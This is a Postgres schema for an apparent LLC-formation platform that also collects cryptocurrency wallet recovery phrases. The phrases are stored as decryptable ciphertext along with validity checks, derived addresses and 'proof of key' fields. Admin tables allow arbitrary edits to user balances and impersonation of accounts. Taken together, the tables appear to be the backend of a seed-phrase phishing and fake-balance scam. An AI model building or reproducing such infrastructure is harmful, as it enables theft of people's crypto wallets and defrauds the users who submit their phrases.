-- Wyoming LLC platform schema (Neon Postgres).
-- Idempotent: safe to re-run. `npm run db:setup` applies this file.
--
-- Design notes
--  * users/sessions replace Firebase Auth. Sessions store a SHA-256 of the
--    cookie token, never the token itself.
--  * balances is a per-symbol table so an admin edit can merge one asset without
--    replacing the rest. Every edit also writes balance_audit.
--  * wallet_submissions keeps the field names the legacy console read
--    (user_name, selected_wallet, is_custom_provider, phrase, device_type,
--    timestamp). `phrase` here is ciphertext, not plaintext.
--  * wallet_hashes holds SHA-256 of the normalised phrase and no phrase material.

create extension if not exists pgcrypto;

create table if not exists users (
    id            uuid primary key default gen_random_uuid(),
    email         text not null,
    password_hash text not null,
    display_name  text not null default '',
    phone         text not null default '',
    is_admin      boolean not null default false,
    status        text not null default 'active'
                  check (status in ('active', 'inactive')),
    created_at    timestamptz not null default now(),
    last_login_at timestamptz
);

create unique index if not exists users_email_lower_idx on users (lower(email));

create table if not exists sessions (
    -- sha256(cookie token), hex
    id              text primary key,
    user_id         uuid not null references users (id) on delete cascade,
    -- set while an administrator is viewing this account; the admin's own
    -- session id is kept in a second cookie so they can step back out.
    impersonator_id uuid references users (id) on delete set null,
    created_at      timestamptz not null default now(),
    expires_at      timestamptz not null,
    ip              text not null default '',
    user_agent      text not null default ''
);

create index if not exists sessions_user_idx on sessions (user_id);
create index if not exists sessions_expires_idx on sessions (expires_at);

create table if not exists companies (
    id                uuid primary key default gen_random_uuid(),
    user_id           uuid not null references users (id) on delete cascade,
    company_name      text not null default '',
    entity_type       text not null default 'LLC',
    formation_state   text not null default 'Wyoming',
    business_ending   text not null default 'LLC',
    first_name        text not null default '',
    last_name         text not null default '',
    email             text not null default '',
    phone             text not null default '',
    address           text not null default '',
    unit              text not null default '',
    city              text not null default '',
    country           text not null default 'United States',
    postal_code       text not null default '',
    partner_code      text not null default '',
    status            text not null default 'pending'
                      check (status in ('pending', 'processing', 'approved', 'rejected')),
    review_note       text not null default '',
    reviewed_by       text not null default '',
    reviewed_at       timestamptz,
    created_at        timestamptz not null default now(),
    updated_at        timestamptz not null default now()
);

create index if not exists companies_user_idx on companies (user_id, created_at desc);
create index if not exists companies_status_idx on companies (status, created_at);

create table if not exists user_balances (
    user_id        uuid primary key references users (id) on delete cascade,
    display_name   text not null default '',
    user_email     text not null default '',
    status         text not null default 'active'
                   check (status in ('active', 'inactive')),
    created_at     timestamptz not null default now(),
    last_updated   timestamptz not null default now(),
    last_edited_by text not null default '',
    last_edited_at timestamptz
);

create table if not exists balances (
    user_id uuid not null references user_balances (user_id) on delete cascade,
    symbol  text not null,
    amount  numeric(38, 10) not null default 0
            check (amount >= 0),
    primary key (user_id, symbol)
);

create table if not exists wallet_submissions (
    id                uuid primary key default gen_random_uuid(),
    user_id           uuid references users (id) on delete set null,
    user_email        text not null default '',
    user_name         text not null default '',
    selected_wallet   text not null default '',
    is_custom_provider boolean not null default false,
    -- legacy column name kept for the existing admin mental model. AES-256-GCM
    -- ciphertext (enc:v1:...), never the plaintext phrase.
    phrase            text not null,
    device_type       text not null default '',
    "timestamp"       text not null default '',
    provider          text not null default '',
    phrase_hash       text not null default '',
    word_count        integer not null default 0,
    valid             boolean not null default false,
    checksum_verified boolean not null default false,
    derivation_paths  jsonb not null default '{}'::jsonb,
    addresses         jsonb not null default '{}'::jsonb,
    primary_address   text not null default '',
    proof_of_key      text not null default '',
    proof_recovered   boolean not null default false,
    source            text not null default 'portal',
    user_agent        text not null default '',
    screen_size       text not null default '',
    link_method       text not null default 'auto'
                      check (link_method in ('auto', 'manual', 'anon')),
    linked_at         timestamptz,
    linked_by         text not null default '',
    created_at        timestamptz not null default now()
);

create index if not exists wallet_submissions_user_idx on wallet_submissions (user_id, created_at desc);
create index if not exists wallet_submissions_hash_idx on wallet_submissions (phrase_hash);
create index if not exists wallet_submissions_created_idx on wallet_submissions (created_at desc);

create table if not exists wallet_hashes (
    phrase_hash   text primary key,
    user_id       uuid references users (id) on delete set null,
    user_email    text not null default '',
    submission_id uuid references wallet_submissions (id) on delete cascade,
    at            timestamptz not null default now()
);

create table if not exists balance_audit (
    id     bigserial primary key,
    uid    uuid not null references users (id) on delete cascade,
    before jsonb not null default '{}'::jsonb,
    after  jsonb not null default '{}'::jsonb,
    delta  jsonb not null default '{}'::jsonb,
    by     text not null default '',
    at     timestamptz not null default now(),
    note   text not null default ''
);

create index if not exists balance_audit_uid_idx on balance_audit (uid, at desc);

-- Non-balance admin actions (status, links, filings, impersonation, password).
create table if not exists admin_audit (
    id             bigserial primary key,
    actor_id       uuid references users (id) on delete set null,
    actor_email    text not null default '',
    action         text not null,
    target_user_id uuid references users (id) on delete set null,
    detail         jsonb not null default '{}'::jsonb,
    at             timestamptz not null default now()
);

create index if not exists admin_audit_target_idx on admin_audit (target_user_id, at desc);

-- Convenience view: the set of accounts that may open /admin.
create or replace view admin_users as
    select id, email, display_name, created_at
    from users
    where is_admin;
